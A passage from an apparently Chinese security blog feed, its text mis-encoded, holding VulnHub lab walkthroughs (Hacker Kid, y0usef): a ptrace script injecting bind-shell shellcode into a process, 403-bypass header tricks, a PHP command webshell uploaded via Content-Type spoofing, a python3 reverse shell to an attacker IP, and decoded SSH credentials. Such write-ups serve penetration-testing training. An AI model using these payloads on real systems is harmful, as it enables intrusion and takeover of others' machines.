&lt;sys/ptrace.h&gt;</span><br><span class="line">&gt;# https://code.woboq.org/qt5/include/sys/ptrace.h.html</span><br><span class="line"></span><br><span class="line">&gt;PTRACE_POKETEXT   = 4</span><br><span class="line">&gt;PTRACE_GETREGS= 12</span><br><span class="line">&gt;PTRACE_SETREGS= 13</span><br><span class="line">&gt;PTRACE_ATTACH = 16</span><br><span class="line">&gt;PTRACE_DETACH = 17</span><br><span class="line"></span><br><span class="line">&gt;# Structure defined in &lt;sys/user.h&gt;</span><br><span class="line">&gt;# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span><br><span class="line"></span><br><span class="line">&gt;class user_regs_struct(ctypes.Structure):</span><br><span class="line">_fields_ = [</span><br><span class="line">   (&quot;r15&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r14&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r13&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r12&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rbp&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rbx&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r11&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r10&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r9&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r8&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rcx&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rdx&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rsi&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rdi&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;orig_rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rip&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;cs&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;eflags&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rsp&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;ss&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;fs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;gs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;ds&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;es&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;fs&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;gs&quot;, ctypes.c_ulonglong),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">&gt;libc = ctypes.CDLL(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">&gt;pid=int(sys.argv[1])</span><br><span class="line"></span><br><span class="line">&gt;# Define argument type and respone type.</span><br><span class="line">&gt;libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">&gt;libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line">&gt;# Attach to the process</span><br><span class="line">&gt;libc.ptrace(PTRACE_ATTACH, pid, None, None)</span><br><span class="line">&gt;registers=user_regs_struct()</span><br><span class="line"></span><br><span class="line">&gt;# Retrieve the value stored in registers</span><br><span class="line">&gt;libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line">&gt;print(&quot;Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line">&gt;print(&quot;Injecting Shellcode at: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line">&gt;# Shell code copied from exploit db.</span><br><span class="line">&gt;shellcode=&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">&gt;# Inject the shellcode into the running process byte by byte.</span><br><span class="line">&gt;for i in xrange(0,len(shellcode),4):</span><br><span class="line"></span><br><span class="line"> # Convert the byte to little endian.</span><br><span class="line"> shellcode_byte_int=int(shellcode[i:4+i].encode(&#x27;hex&#x27;),16)</span><br><span class="line"> shellcode_byte_little_endian=struct.pack(&quot;&lt;I&quot;, shellcode_byte_int).rstrip(&#x27;\x00&#x27;).encode(&#x27;hex&#x27;)</span><br><span class="line"> shellcode_byte=int(shellcode_byte_little_endian,16)</span><br><span class="line"></span><br><span class="line"> # Inject the byte.</span><br><span class="line"> libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)</span><br><span class="line"></span><br><span class="line">&gt;print(&quot;Shellcode Injected!!&quot;)</span><br><span class="line"></span><br><span class="line">&gt;# Modify the instuction pointer</span><br><span class="line">&gt;registers.rip=registers.rip+2</span><br><span class="line"></span><br><span class="line">&gt;# Set the registers</span><br><span class="line">&gt;libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line">&gt;print(&quot;Final Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line">&gt;# Detach from the process.</span><br><span class="line">&gt;libc.ptrace(PTRACE_DETACH, pid, None, None)</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 inject.py ID  #å°†åé—¨å†™è¿›è¿›ç¨‹ï¼Œå¹¶åœ¨æœ¬åœ°å¼€å¯ç«¯å£5600ç«¯å£</span><br></pre></td></tr></table></figure><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230191858784.png" alt="image-20211230191858784" style="zoom: 50%;" /><p>æŸ¥çœ‹5600ç«¯å£æ˜¯å¦å¼€å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -pantu | grep 5600</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211230192016676.png" alt="image-20211230192016676">ç»“æœæ˜¾ç¤ºå¼€å¯ï¼Œåˆ™è¯´æ˜æ³¨å…¥æˆåŠŸï¼Œåé—¨è¿›ç¨‹ç«¯å£å·²æˆåŠŸå¼€æ”¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.137.244 5600</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230192038184.png" alt="image-20211230192038184"></p><p>æˆåŠŸè·å–rootæƒé™</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;é¶æœºï¼š&lt;a href=&quot;https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova&quot;&gt;https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova&lt;/a&gt;&lt;br&gt;  éš¾åº¦ï¼šä¸­&lt;br&gt;  ç›®æ ‡ï¼šå–å¾—rootæƒé™&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-8-y0usef</title>
    <link href="http://example.com/2022/04/12/week8/"/>
    <id>http://example.com/2022/04/12/week8/</id>
    <published>2022-04-12T07:08:42.967Z</published>
    <updated>2022-04-12T07:11:31.168Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>é¶æœºåœ°å€ï¼š</strong><a href="https://download.vulnhub.com/y0usef/y0usef.ova">https://download.vulnhub.com/y0usef/y0usef.ova</a></p><p><strong>éš¾åº¦ç­‰çº§ï¼š</strong>ä½</p><p><strong>æ‰“é¶ç›®æ ‡ï¼š</strong>å–å¾— root æƒé™ + 2 Flag</p></blockquote><span id="more"></span><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093012124.png" alt="image-20220216093012124"></p><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 192.168.137.233</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093201459.png" alt="image-20220216093201459"></p><h3 id="æœåŠ¡æ¢æµ‹"><a href="#æœåŠ¡æ¢æµ‹" class="headerlink" title="æœåŠ¡æ¢æµ‹"></a>æœåŠ¡æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80-sV -sC 192.168.137.233</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093937980.png" alt="image-20220216093937980"></p><h2 id="äºŒã€æ¼æ´å‘ç°"><a href="#äºŒã€æ¼æ´å‘ç°" class="headerlink" title="äºŒã€æ¼æ´å‘ç°"></a>äºŒã€æ¼æ´å‘ç°</h2><h3 id="è®¿é—®80ç«¯å£"><a href="#è®¿é—®80ç«¯å£" class="headerlink" title="è®¿é—®80ç«¯å£"></a>è®¿é—®80ç«¯å£</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094324955.png" alt="image-20220216094324955"></p><p>é¡µé¢æç¤ºè¯¥ç½‘ç«™æ­£åœ¨å»ºè®¾ä¸­ï¼Œä½†å®ƒå·²ç»åœ¨è¿è¡Œ</p><h4 id="æŸ¥çœ‹æºä»£ç "><a href="#æŸ¥çœ‹æºä»£ç " class="headerlink" title="æŸ¥çœ‹æºä»£ç "></a>æŸ¥çœ‹æºä»£ç </h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094548943.png" alt="image-20220216094548943"></p><p>ä¹Ÿå¹¶æœªå‘ç°æœ‰å¸®åŠ©çš„ä¿¡æ¯</p><h4 id="whatwebç½‘ç«™æŒ‡çº¹è¯†åˆ«"><a href="#whatwebç½‘ç«™æŒ‡çº¹è¯†åˆ«" class="headerlink" title="whatwebç½‘ç«™æŒ‡çº¹è¯†åˆ«"></a>whatwebç½‘ç«™æŒ‡çº¹è¯†åˆ«</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.137.233</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094848943.png" alt="image-20220216094848943"></p><h4 id="dirsearchç›®å½•æ‰«æ"><a href="#dirsearchç›®å½•æ‰«æ" class="headerlink" title="dirsearchç›®å½•æ‰«æ"></a>dirsearchç›®å½•æ‰«æ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.137.233</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216095152430.png" alt="image-20220216095152430"></p><p>ç»“æœæ˜¾ç¤ºäº†å¤§é‡403å“åº”ç ï¼Œä¹Ÿå°±æ„å‘³ç€ç›®æ ‡æœåŠ¡å™¨ä¸Šå­˜åœ¨è¿™äº›ç›®å½•&#x2F;æ–‡ä»¶ï¼Œä½†æ˜¯å› æƒé™ä¸è¶³ä¸èƒ½è®¿é—®ã€‚</p><blockquote><p>403é”™è¯¯æ˜¯ç½‘ç«™è®¿é—®è¿‡ç¨‹ä¸­ï¼Œå¸¸è§çš„é”™è¯¯æç¤ºã€‚èµ„æºä¸å¯ç”¨ï¼ŒæœåŠ¡å™¨ç†è§£å®¢æˆ·çš„è¯·æ±‚ï¼Œä½†æ‹’ç»å¤„ç†å®ƒã€‚é€šå¸¸ç”±äºæœåŠ¡å™¨ä¸Šæ–‡ä»¶æˆ–ç›®å½•çš„æƒé™è®¾ç½®å¯¼è‡´ï¼Œæ¯”å¦‚IISæˆ–è€…apacheè®¾ç½®äº†è®¿é—®æƒé™ä¸å½“ã€‚</p></blockquote><p>è®¿é—®<a href="http://192.168.137.233/adminstration/">http://192.168.137.233/adminstration/</a></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216095610319.png" alt="image-20220216095610319"></p><p>å¯èƒ½ç½‘ç«™çš„ç®¡ç†è€…å¯¹æƒé™è¿›è¡Œäº†ä¸€äº›é™åˆ¶ç®¡ç†ï¼Œé‚£æ¥ä¸‹æ¥è¯¥å¦‚ä½•è§£å†³403å‘¢ï¼Ÿ</p><h4 id="403Bypass"><a href="#403Bypass" class="headerlink" title="403Bypass"></a>403Bypass</h4><p>æŠ“å–é¡µé¢è¯·æ±‚çš„åŒ…å‘é€åˆ°Burpå†…çš„Repeater</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216100952570.png" alt="image-20220216100952570"></p><h5 id="å¸¸è§çš„4ç§403Bypass"><a href="#å¸¸è§çš„4ç§403Bypass" class="headerlink" title="å¸¸è§çš„4ç§403Bypass"></a>å¸¸è§çš„4ç§403Bypass</h5><h6 id="ä½¿ç”¨æ—ç«™ç»•è¿‡403"><a href="#ä½¿ç”¨æ—ç«™ç»•è¿‡403" class="headerlink" title="ä½¿ç”¨æ—ç«™ç»•è¿‡403"></a>ä½¿ç”¨æ—ç«™ç»•è¿‡403</h6><blockquote><p>ä¾‹ï¼š</p><p>å¦‚ä¸‹æ˜¯ä¸€ä¸ªæ­£å¸¸çš„è¯·æ±‚å“åº”403è¿‡ç¨‹</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p><p> Host:<a href="http://www.abc.com/">www.abc.com</a>                   <strong>#è¯·æ±‚å¤´</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 403 Forbidden</p><p>é’ˆå¯¹æ—ç«™è¿›è¡Œä¿®æ”¹</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p><p> Host: $<strong>xxx</strong>$.abc.com                    <strong>#æ›¿æ¢ä¸»æœºå</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 200 OK</p><p>è¯´æ˜ï¼šå¦‚æœæœåŠ¡å™¨åœ¨è¿›è¡ŒACLè®¿é—®æ§åˆ¶æ—¶ï¼Œå¯¹è®¿é—®<code>http://IP/auth/login</code>æ˜¯éªŒè¯<strong>è¯·æ±‚å¤´Host</strong>ï¼Œé‚£ä¹ˆå°è¯•ä¿®æ”¹å…¶<strong>è¯·æ±‚å¤´Hostçš„å¤´éƒ¨</strong>ï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸ºæ˜¯<strong>ä¼ä¸šå†…éƒ¨çš„å¦å¤–ä¸€å°æœºå™¨</strong>å¯¹<code>http://IP/auth/login</code>çš„æ­£å¸¸è®¿é—®ï¼Œåˆ™å¯èƒ½åˆ©ç”¨æ­¤éªŒè¯æœºåˆ¶ç»•è¿‡403é™åˆ¶ã€‚</p></blockquote><h6 id="ä½¿ç”¨è¦†ç›–URLçš„æ–¹å¼ç»•è¿‡403"><a href="#ä½¿ç”¨è¦†ç›–URLçš„æ–¹å¼ç»•è¿‡403" class="headerlink" title="ä½¿ç”¨è¦†ç›–URLçš„æ–¹å¼ç»•è¿‡403"></a>ä½¿ç”¨è¦†ç›–URLçš„æ–¹å¼ç»•è¿‡403</h6><blockquote><p>ä¾‹ï¼š</p><p>å¦‚ä¸‹æ˜¯ä¸€ä¸ªæ­£å¸¸çš„è¯·æ±‚å“åº”403è¿‡ç¨‹</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1                 <strong>#è¯·æ±‚è¡Œ</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 403 Forbidden</p><p>è¦†ç›–URL</p><p>#Request</p><p> GET &#x2F; HTTP&#x2F;1.1</p><p> X-Original-URL: &#x2F;auth&#x2F;login               <strong>#è¦†ç›–URL</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 200 OK</p><p>è¯´æ˜ï¼šå¦‚æœæœåŠ¡å™¨åœ¨è¿›è¡ŒACLè®¿é—®æ§åˆ¶æ—¶ï¼Œå¯¹è®¿é—®<code>http://IP/auth/login</code>æ˜¯éªŒè¯è¯·æ±‚è¡ŒURLï¼Œé‚£ä¹ˆå°è¯•<strong>æ·»åŠ éæ ‡å‡†çš„HTTPå¤´</strong>ï¼ˆä¾‹å¦‚X-Original-URLã€X-Rewrite-URLï¼‰ï¼Œ<strong>æ¥è¦†ç›–&#x2F;é‡å†™åŸå§‹è¯·æ±‚è¡Œä¸­çš„URL</strong>ï¼Œå°è¯•ä½¿ç”¨è¯¥æ–¹æ³•ç»•è¿‡403æƒé™é™åˆ¶æ£€æŸ¥ã€‚</p></blockquote><h6 id="åˆ©ç”¨Refererå¤´éƒ¨ç»•è¿‡403"><a href="#åˆ©ç”¨Refererå¤´éƒ¨ç»•è¿‡403" class="headerlink" title="åˆ©ç”¨Refererå¤´éƒ¨ç»•è¿‡403"></a>åˆ©ç”¨Refererå¤´éƒ¨ç»•è¿‡403</h6><blockquote><p>ä¾‹ï¼š</p><p>å¦‚ä¸‹æ˜¯ä¸€ä¸ªæ­£å¸¸çš„è¯·æ±‚å“åº”403è¿‡ç¨‹</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1            </p><p>#Response</p><p> HTTP&#x2F;1.1 403 Forbidden</p><p>è¦†ç›–URL</p><p>#Request</p><p> GET &#x2F; HTTP&#x2F;1.1</p><p> Referer: <a href="https://ip/auth/login">https://IP/auth/login</a>      <strong>#æ¥æºé¡µé¢</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 200 OK</p><p>è¡¥å……ï¼šä¹Ÿå¯ä»¥ä½¿ç”¨<strong>Refererå¤´éƒ¨</strong>ï¼ˆRefereråŒ…å«ä¸€ä¸ªURLï¼Œä»£è¡¨å½“å‰è®¿é—®URLçš„ä¸Šä¸€ä¸ªURLï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨æˆ·æ˜¯ä»ä»€ä¹ˆåœ°æ–¹æ¥åˆ°æœ¬é¡µé¢ã€‚å¦‚<code>http://IP/login.php</code>ï¼Œå³ä»£è¡¨ç”¨æˆ·ä»login.phpæ¥åˆ°å½“å‰é¡µé¢ï¼‰ï¼Œå¦‚æœ<strong>Refererå¤´éƒ¨</strong>å†…çš„URLæ˜¯ä¸€ä¸ª<strong>éœ€è¦è¾ƒé«˜æƒé™æ‰å¯è®¿é—®çš„URL</strong>ï¼Œè‹¥æœåŠ¡å™¨ä¼šæ ¹æ®<strong>Refererå¤´éƒ¨</strong>æ¥åˆ¤æ–­çš„è¯ï¼Œåˆ™ä¼šè®¤ä¸º<strong>æ˜¯å·²ç»éªŒè¯è¿‡çš„æƒé™ç”¨æˆ·</strong>ï¼Œå¯ç›´æ¥è®¿é—®å½“å‰è¦è®¿é—®çš„é¡µé¢ï¼Œå¯å€Ÿæ­¤ç»•è¿‡403.</p></blockquote><h6 id="åˆ©ç”¨åå‘ä»£ç†ç»•è¿‡403"><a href="#åˆ©ç”¨åå‘ä»£ç†ç»•è¿‡403" class="headerlink" title="åˆ©ç”¨åå‘ä»£ç†ç»•è¿‡403"></a>åˆ©ç”¨åå‘ä»£ç†ç»•è¿‡403</h6><blockquote><p>ä¾‹ï¼š</p><p>å¦‚ä¸‹æ˜¯ä¸€ä¸ªæ­£å¸¸çš„è¯·æ±‚å“åº”403è¿‡ç¨‹</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p><p> Host: 192.168.137.233                 </p><p>#Response</p><p> HTTP&#x2F;1.1 403 Forbidden</p><p>é’ˆå¯¹æ—ç«™è¿›è¡Œä¿®æ”¹</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p><p> Host: 192.168.137.233   </p><p> X-Originating-IP: 127.0.0.1           <strong>#ä»£ç†æœ¬åœ°</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 200 OK</p><p>è¯´æ˜ï¼šå¦‚æœæœåŠ¡å™¨åœ¨è¿›è¡ŒACLè®¿é—®æ§åˆ¶æ—¶ï¼Œé‚£ä¹ˆå°è¯•<strong>æ·»åŠ éæ ‡å‡†çš„HTTPå¤´</strong>ï¼ˆä¾‹å¦‚X-Originating-IPã€X-Remote-IPã€X-Forwarded-Forï¼‰ï¼Œ<strong>æ¥ä½¿æœåŠ¡å™¨è®¤ä¸ºè¯·æ±‚æ¥è‡ªæœåŠ¡å™¨æœ¬åœ°</strong>ï¼Œå°è¯•ä½¿ç”¨è¯¥æ–¹æ³•ç»•è¿‡403æƒé™é™åˆ¶æ£€æŸ¥ã€‚</p></blockquote><p>ç»è¿‡å¯¹ä»¥ä¸Š4ç§æ–¹æ³•çš„é€ä¸€å°è¯•ï¼Œæœ€ç»ˆ<strong>åˆ©ç”¨åå‘ä»£ç†ç»•è¿‡403</strong></p><h5 id="åå‘ä»£ç†403Bypass"><a href="#åå‘ä»£ç†403Bypass" class="headerlink" title="åå‘ä»£ç†403Bypass"></a>åå‘ä»£ç†403Bypass</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112556365.png" alt="image-20220216112556365"></p><p>å°†å…¶æ”¾å…¥Intruederä¸­ForwardåŒ…</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112723612.png" alt="image-20220216112723612"></p><p>é¡µé¢è·³è½¬è‡³ç™»é™†è¡¨å•</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112808474.png" alt="image-20220216112808474"></p><h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><p>ç»è¿‡å°è¯•å‘ç°è¯¥è¡¨å•è´¦å·å¯†ç éƒ½ä¸ºå¼±å£ä»¤admin</p><p>å°è¯•æäº¤ç”¨æˆ·åå¯†ç å¹¶è¿›è¡ŒæŠ“åŒ…ï¼ˆé¡»åœ¨æ¯ä¸€æ¬¡è¯·æ±‚æ—¶æ·»åŠ X-Forwarded-Forç»•è¿‡403ï¼‰</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113139211.png" alt="image-20220216113139211"></p><p>è¿›å…¥äº†åå°é¡µé¢ï¼Œå‘ç°å¥½åƒæœ‰ä¸Šä¼ é¡µé¢</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113517608.png" alt="image-20220216113517608"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113658637.png" alt="image-20220216113658637"></p><p>å†™ä¸€å¥è¯æœ¨é©¬a.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $var=shell_exec($_GET[&#x27;cmd&#x27;]); echo $var ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216114951617.png" alt="image-20220216114951617"></p><p>åˆæ¬¡ä¸Šä¼ å‘ç°æœåŠ¡ç«¯æœ‰å¯¹ä¸Šä¼ æ–‡ä»¶çš„æ ¡éªŒ</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115137076.png" alt="image-20220216115137076"></p><p>ç»è¿‡å°è¯•ä¿®æ”¹Content-Typeå³å¯ç»•è¿‡ä¸Šä¼ æˆåŠŸ</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115304086.png" alt="image-20220216115304086"></p><p>è®¿é—®a.phpï¼ˆä¸Šä¼ åä¿®æ”¹äº†åå­—ï¼‰</p><p><code>http://192.168.137.233/adminstration/upload/files/1644983531a.php</code></p><p>è®°å¾—æ·»åŠ X-Forwarded-Forç»•è¿‡403</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115527530.png" alt="image-20220216115527530"></p><p>é¡µé¢è®¿é—®æˆåŠŸä¸ºç©º</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115622776.png" alt="image-20220216115622776"></p><p>å°è¯•æ‰§è¡Œå‘½ä»¤</p><p>æŸ¥çœ‹å½“å‰ç”¨æˆ·</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115804186.png" alt="image-20220216115804186"></p><p>ä¸ºæ™®é€šæƒé™ç”¨æˆ·</p><h2 id="ä¸‰ã€ææƒ"><a href="#ä¸‰ã€ææƒ" class="headerlink" title="ä¸‰ã€ææƒ"></a>ä¸‰ã€ææƒ</h2><h3 id="æŸ¥çœ‹ç›®æ ‡æœåŠ¡å™¨ä¸Šæ˜¯å¦æœ‰python"><a href="#æŸ¥çœ‹ç›®æ ‡æœåŠ¡å™¨ä¸Šæ˜¯å¦æœ‰python" class="headerlink" title="æŸ¥çœ‹ç›®æ ‡æœåŠ¡å™¨ä¸Šæ˜¯å¦æœ‰python"></a>æŸ¥çœ‹ç›®æ ‡æœåŠ¡å™¨ä¸Šæ˜¯å¦æœ‰python</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216120212970.png" alt="image-20220216120212970"></p><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.137.22&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>kaliå¼€å¯ä¾¦å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143055578.png" alt="image-20220216143055578"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216142807426.png" alt="image-20220216142807426"></p><p>æˆåŠŸåå¼¹shell</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143312167.png" alt="image-20220216143312167"></p><p>æŸ¥çœ‹&#x2F;etc&#x2F;passwdæ–‡ä»¶</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143455257.png" alt="image-20220216143455257"></p><p>æŸ¥çœ‹&#x2F;homeç›®å½•</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143717439.png" alt="image-20220216143717439"></p><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure><h3 id="SSHç™»é™†"><a href="#SSHç™»é™†" class="headerlink" title="SSHç™»é™†"></a>SSHç™»é™†</h3><p>å°è¯•base64è§£ç </p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143832430.png" alt="image-20220216143832430"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh : </span><br><span class="line">user : yousef </span><br><span class="line">pass : yousef123</span><br></pre></td></tr></table></figure><p>è§£ç å®Œæˆåä¿¡æ¯æ˜¾ç¤ºæ˜¯sshçš„è´¦å·å¯†ç ï¼ˆä¹‹å‰ç«¯å£æ‰«æç¡®å®å­˜åœ¨22ç«¯å£çš„sshï¼‰</p><p>å°è¯•è¿æ¥</p><p><img 